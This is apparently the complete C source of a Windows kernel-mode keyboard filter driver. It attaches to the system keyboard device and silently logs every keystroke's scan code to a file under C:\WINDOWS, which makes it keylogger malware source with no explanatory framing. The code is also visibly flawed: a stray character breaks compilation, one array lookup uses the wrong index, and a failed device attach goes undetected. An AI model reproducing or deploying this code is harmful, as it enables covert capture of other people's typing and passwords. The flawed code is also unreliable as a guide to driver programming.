#include "ntddk.h"
#include "ntstrsafe.h"
#define BUFFER_SIZE 30

PDEVICE_OBJECT myKbdDevice = NULL;
UNICODE_STRING fileName = RTL_CONSTANT_STRING(L"\\DosDevices\\c:\\WINDOWS\\KbdLogs.txt");
HANDLE fileHandle;

typedef struct {
	PDEVICE_OBJECT LowerKbdDevice;
}DEVICE_EXTENSION, * PDEVICE_EXTENSION;

typedef struct _KEYBOARD_INPUT_DATA {
	USHORT UnitId;
	USHORT MakeCode;
	USHORT Flags;s
	USHORT Reserved;
	ULONG  ExtraInformation;
} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;

typedef struct KEY_INFO {
	PIO_WORKITEM item;
	UINT32 scanCode;
	int flag;
} KEY_INFO, * PKEY_INFO;


CHAR* keyflag[4] = { "KeyDown", "KeyUp", "E0","E1" };

ULONG pendingkey = 0;


VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject) {

	LARGE_INTEGER interval = { 0 };
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;

	interval.QuadPart = -10 * 1000 * 1000;
	IoDetachDevice(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice);

	while (pendingkey) {
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}

	IoDeleteDevice(myKbdDevice);

	ZwClose(fileHandle);

	KdPrint(("Unload Driver\r\n"));
}

NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	IoCopyCurrentIrpStackLocationToNext(Irp);
	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice, Irp);

}


VOID WriteLogToFile(PDEVICE_OBJECT DeviceObject, PKEY_INFO ki) {

	CHAR buffer[BUFFER_SIZE];
	size_t cb;

	NTSTATUS status;
	IO_STATUS_BLOCK ioStatusBlock;
	status = RtlStringCbPrintfA(buffer, sizeof(buffer), "Scan Code: %xH (%s)\n", ki->scanCode, keyflag[ki->flag]);
	if (NT_SUCCESS(status)) {
		status = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);
		if (NT_SUCCESS(status)) {
			status = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, buffer, cb, NULL, NULL);
		}
	}

	IoFreeWorkItem(ki->item);
	ExFreePool(ki);
}


NTSTATUS ReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {


	DbgPrint("Read Complete IRQL - %u\r\n", KeGetCurrentIrql());


	PKEYBOARD_INPUT_DATA Keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

	int structnum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
	int i;

	if (Irp->IoStatus.Status == STATUS_SUCCESS) {
		for (i = 0; i < structnum; i++) {
			KdPrint(("Scan Code: %xH (%s)\n", Keys[i].MakeCode, keyflag[Keys->Flags]));
			PKEY_INFO ki = (PKEY_INFO)ExAllocatePool(NonPagedPool, sizeof(KEY_INFO));
			ki->item = IoAllocateWorkItem(DeviceObject);
			ki->flag = Keys->Flags;
			ki->scanCode = Keys[i].MakeCode;
			IoQueueWorkItem(ki->item, (PIO_WORKITEM_ROUTINE)WriteLogToFile, CriticalWorkQueue, ki);
		}
	}
	if (Irp->PendingReturned) {
		IoMarkIrpPending(Irp);
	}
	pendingkey--;
	return Irp->IoStatus.Status;
}

NTSTATUS DispatchRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {


	IoCopyCurrentIrpStackLocationToNext(Irp);

	DbgPrint("Dispatch Read IRQL - %u\r\n", KeGetCurrentIrql());

	IoSetCompletionRoutine(Irp, ReadComplete, NULL, TRUE, TRUE, TRUE);

	pendingkey++;

	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice, Irp);
}





NTSTATUS MyAttachDevice(PDRIVER_OBJECT DriverObject) {

	NTSTATUS status;
	UNICODE_STRING TargetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");


	status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &myKbdDevice);

	if (!NT_SUCCESS(status)) {
		return status;
	}

	myKbdDevice->Flags |= DO_BUFFERED_IO;
	myKbdDevice->Flags &= ~DO_DEVICE_INITIALIZING;

	RtlZeroMemory(myKbdDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));

	IoAttachDevice(myKbdDevice, &TargetDevice, &((PDEVICE_EXTENSION)myKbdDevice->DeviceExtension)->LowerKbdDevice);

	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(myKbdDevice);
		return status;
	}

	return STATUS_SUCCESS;

}



NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {

	NTSTATUS status;
	int i;
	DriverObject->DriverUnload = UnloadDriver;

	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = DispatchPass;
	}

	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	IO_STATUS_BLOCK ioStatusBlock;
	status = ZwCreateFile(&fileHandle, GENERIC_WRITE | GENERIC_READ, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (!NT_SUCCESS(status)) {
		DbgPrint("Creating log file Failed!\r\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	DbgPrint("Driver Entry IRQL - %u\r\n", KeGetCurrentIrql());


	DbgPrint("Driver is loaded\r\n");

	status = MyAttachDevice(DriverObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Attaching failed\r\n"));
		return STATUS_FAILED_DRIVER_ENTRY;
	}
	else {
		KdPrint(("Attaching succeeded\r\n"));
	}

	return STATUS_SUCCESS;
}